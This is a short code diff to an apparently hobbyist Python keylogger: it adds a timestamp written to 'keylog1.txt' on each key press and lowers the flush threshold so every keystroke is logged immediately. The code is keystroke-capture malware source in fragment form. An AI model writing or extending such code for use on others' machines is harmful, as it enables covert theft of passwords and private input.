@@ -4,12 +4,17 @@ count = 0
 key_press = []
 def on_press(key):
     global count, key_press
+    date = datetime.now().strftime("%Y_%m_%d-%I:%M:%S_%p")
+    with open("keylog1.txt","a") as f:
+        f.write(" ")
+        f.write(str(date))
+        f.write('\n')
 
     key_press.append(key)
     count = count + 1
     print(key, " pressed")
 
-    if count >= 5:
+    if count >= 1:
         count = 0
         log_write(key_press)
         key_press = []  
